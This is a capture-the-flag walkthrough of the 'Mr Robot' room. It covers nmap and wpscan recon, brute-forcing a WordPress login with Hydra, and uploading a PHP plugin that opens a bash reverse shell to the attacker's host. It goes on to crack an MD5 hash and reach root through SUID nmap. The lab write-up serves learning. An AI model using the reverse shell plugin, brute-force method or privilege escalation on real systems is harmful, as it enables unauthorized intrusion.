Mr Robot CTF Room

This is a CTF room, doesn’t provide any information about the target, just it’s IP.

There are 3 flags to find.

Tools used:
- Kali Linux
- nmap
- wpscan
- burp
- hydra
- hashcat
- searchsploit
- wordpress reverse shell plugin
- python
- linux shell

This flag took me quite some time with a bit of trial and error. I also had to do research during most steps and switch tools around as needed, but I got there in the end. 

1. Recon

Let’s start with a nmap port scan and go from there.

![image](https://user-images.githubusercontent.com/60744763/128162355-5e4980b5-ef3d-4da5-8da6-ba5e0b40f4ce.png)


It looks like there is a login form at /wp-login.php. 

![image](https://user-images.githubusercontent.com/60744763/128162381-8be9ac24-9cac-47c9-8f68-4685cad53d1d.png)

Opening this shows us a wordpress login page.
This might be an interesting place to start.


Next I’ll do a basic scan for wordpress vulnerabilities with wpscan

This has shown us quite a few interesting things we can delve into.

![image](https://user-images.githubusercontent.com/60744763/128162477-dc5e6394-6ba0-48f1-b9a6-c7aa81280fe4.png)



First I see the robot.txt file, lets see what this contains:

![image](https://user-images.githubusercontent.com/60744763/128162489-855c8ffa-20b7-4565-b1fa-53ce88959ca0.png)
 

This might be the location of our first flag..!?
browsing to 10.10.190.95/key-1-of-3.txt has shown us the first flag :D

Let’s see what ‘fsocity.dic’ is…
An interesting looking file, maybe passwords!?

![image](https://user-images.githubusercontent.com/60744763/128162514-61f6b155-5015-43f0-b26a-5c2b4e915b1c.png)
 

Now we can see that the WPScan has told us the wordpress version and that it is insecure.

Lets look up this version on searchspoilt…
![image](https://user-images.githubusercontent.com/60744763/128162542-70b2208f-0321-47df-b5f4-9b57f2d741df.png)
 

Some interesting options here to go through. We could try the username enumeration exploit along with the fsocity.dic file we found as a username / password combination. 

We need a username to use the exploit 41963.txt – unauth password reset, so that has to wait. 
UPDATE: Coming back to this, I went to the reset password page for the username we found in a later step – and it appears the mail service is off, so this exploit is no longer an option. 

Let’s try the first exploit and see if we can get the usernames. 
I’ll copy the php exploit file to my folder, edit it with the target’s IP, run a http/php server on my kali box to launch the exploit and see what happens...

![image](https://user-images.githubusercontent.com/60744763/128162588-be7c2e29-6e1a-4e7c-a3a2-fc0b136a1731.png)

![image](https://user-images.githubusercontent.com/60744763/128162611-23ca7b61-957e-4039-ab32-8cc287b9f6dd.png)
As we can see above, the attack didn’t give us any information. 

Now I think we should try a more brutish method… 
UPDATE: in hindsight, this is a themed CTF, which would have made guessing the username quite easy ;)


I’ll go to the wordpress log in page and try some usernames / password combos.
Admin and user and mrrobot all came back with an error, invalid username.
Maybe we can brute force this to find out a user name? 
I’ll start with Burp.

![image](https://user-images.githubusercontent.com/60744763/128162665-c6f93971-2292-46c5-86f8-88016776e0e1.png)

Here we can see the post to the portal. Lets try to brute force it with the dic file we downloaded earlier… 
I’ll send this to the intruder feature of burp, we’ll select the ‘user_login’ field.

![image](https://user-images.githubusercontent.com/60744763/128162696-eee5cb1e-5a0f-479d-ad38-b08b2adde595.png)


Now load the list we downloaded earlier. 
First, lets see if there are many duplicates and remove them before running the attack.
![image](https://user-images.githubusercontent.com/60744763/128162745-c047ddc5-64df-4376-9240-be54607789fa.png)


That’s much smaller now… which should speed up our attack.

Let’s load it and start a sniper attack on the username field and see what we get.

So using Burp was VERY slow, the community version warns that it is throttled, and it really is! I left it for 1 hr and it only got through about 400 attempts. Nothing interesting showing up at the moment, so I’ll try another tool – Hydra.

Using this guide, I setup a Hydra brute force to attempt to get a username.
https://olinux.net/brute-force-attack-login-form/  
We are exploiting the fact that the log in page tells us if the username is valid or not. Once we have a user name I’ll use the same process to try and crack the password. I am using the fsocity.dic file as my dictionary, but with all the duplicates removed as above.

This attack seems much faster. We have some results after a short wait.

It looks like I’ve found a username ‘Elliot’. (DUH! It’s Mr Robot!)
![image](https://user-images.githubusercontent.com/60744763/128162857-1beb225b-2f15-49f7-b05f-1082a74399c8.png)


I’ll leave this attack running in case any other user accounts are found, but in the mean time I will also start a user/pass attack with our newly found information.

Now back to burp to try the username ‘Elliot’ and see what the error is when I use a wrong password. I’ll just try ‘password’.
![image](https://user-images.githubusercontent.com/60744763/128162890-2c1a059b-7160-4e9b-a6d1-f4446f8c0310.png)



We can see the string ‘The password you entered for the username Elliot is incorrect’. That will be our error flag in the next Hydra attack.

I’ve amended our previous Hydra attack to use the username ‘Elliot’ and try passwords from our dictionary. 
Here we go!
![image](https://user-images.githubusercontent.com/60744763/128162905-6ee70216-5edc-46a6-a3fd-c3c98df1ba3d.png)



Bingo! The password was found: ER28-0652
![image](https://user-images.githubusercontent.com/60744763/128162914-2fb03155-e766-4751-abec-dadafaf9216b.png)



 

Logged in to WordPress as Elliot, now let’s play…
![image](https://user-images.githubusercontent.com/60744763/128162927-55037632-2ce7-4cbd-893f-d5df9953335c.png)


Looks like we have admin access to this portal.

![image](https://user-images.githubusercontent.com/60744763/128162954-c1304081-ed45-4c2d-91f6-1b4657829257.png)

 
Maybe we can upload a reverse shell...

Let’s try the plugins section…

We get this message about a .zip plugin, let’s try…
![image](https://user-images.githubusercontent.com/60744763/128162996-54196370-9b1a-4bcb-8bba-4fc2855eaa2a.png)

 
I found this reverse shell plugin code: https://www.sevenlayers.com/index.php/179-wordpress-plugin-reverse-shell 


```<?php

/**
* Plugin Name: Reverse Shell Plugin
* Plugin URI:
* Description: Reverse Shell Plugin
* Version: 1.0
* Author: Vince Matteo
* Author URI: http://www.sevenlayers.com
*/

exec("/bin/bash -c 'bash -i >& /dev/tcp/10.4.37.95/1234 0>&1'");
?>
```

simple code, let’s save it to a php file, zip it up and upload it. Note I have updated the port and IP to point to my kali box.

While that is uploading I’ll open a nc listener on my kali box with `nc -lvnp 1234`

Plugin uploaded
![image](https://user-images.githubusercontent.com/60744763/128163087-db0b59e2-eca4-4358-8f75-2d0f6a029187.png)
 

After clicking activate plugin, my nc received a connection! ;)

AAAAANNNND we have shell!
![image](https://user-images.githubusercontent.com/60744763/128163106-71e5bbfe-57f8-42ea-bb51-69f7aa351d80.png)


Looking around on the server we can see the /home/robot folder, and in here we see a password.raw-md5 and our next flag/key!
![image](https://user-images.githubusercontent.com/60744763/128163122-236e75f6-b6e3-4493-aeb8-0b8ea54706a5.png)

 
But the key is not accessible at this point, logged in as the current user ‘daemon’.
![image](https://user-images.githubusercontent.com/60744763/128163191-54b0b4d0-7ec8-4d09-912a-dde1dd460670.png)


Let’s see what is in this password file, looks like an md5 password has for the user ‘robot’
`robot:c3fcd3d76192e4007dfb496cca67e13b`

Crack time!

Using hashcat I tried the dictionary provided by the site, this did not contain the password. 
Then I tried the ‘rockyou’ dictionary provided in kali, and it cracked in in seconds!

![image](https://user-images.githubusercontent.com/60744763/128163238-4b661e07-bd5a-4131-addd-6fb8edbb2658.png)

 
We can see the password is `abcdefghijklmnopqrstuvwxyz`
Thank goodness for copy/paste :D

Now trying to use the su command to login as a different user I get the following:
![image](https://user-images.githubusercontent.com/60744763/128163283-00957491-2ada-4142-b72e-1c6018d88d36.png)



I imagine this is because the shell is running as daemon. So let’s try upgrade the shell. 

I found this article on upgrading the shell.
https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/ 

In short I simply run a python script/command. Luckily we have python installed on this machine!

The command is: `python -c 'import pty; pty.spawn("/bin/bash")'`
Then I login as the user robot with `su – robot`, paste in our cracked password AND now I have a shell as the user ‘robot’!

Now I can get our 2nd key (or flag) which we saw earlier, as  we now have permissions to read the file :D

![image](https://user-images.githubusercontent.com/60744763/128163340-f86b5e94-92d8-4e50-8d28-156a721bdf70.png)
 

Now let’s see if we can get root access.

I’ll start by searching for suid based files.
![image](https://user-images.githubusercontent.com/60744763/128163385-84bd84fb-2e28-4456-9dc2-4e5f35ff6b17.png)


Nmap might be interesting, it is owned by root. 
![image](https://user-images.githubusercontent.com/60744763/128163418-1b812c80-aa07-473b-837a-cfeea0a93a9e.png)
On my ubuntu desktop the suid bit for nmap is not set so this could be a way in.


Research time! BRB
After some research, I found older versions of nmap have an ‘interactive’ terminal which allows the user to run shell commands from with-in it. It’s very simple, run `nmap --interactive` 
Then we can run commands with the `!<command>` option.
![image](https://user-images.githubusercontent.com/60744763/128163483-f211c572-eb2d-4704-a8cd-81bf73b6ba62.png)


Since the SUID bit is set, and the file is owned by root, we are have effective access root now.
We should be able to do pretty much anything we like from here.

I can even see the key in the /root folder
![image](https://user-images.githubusercontent.com/60744763/128163523-ad7a93e8-3a79-48ec-bb85-bb22a3133a63.png)
 
And we’ve got the last flag!

Let’s open a root shell for fun :D

I am (g)root!
![image](https://user-images.githubusercontent.com/60744763/128163551-9dca9821-a990-4700-8dcf-2ce92a393d04.png)

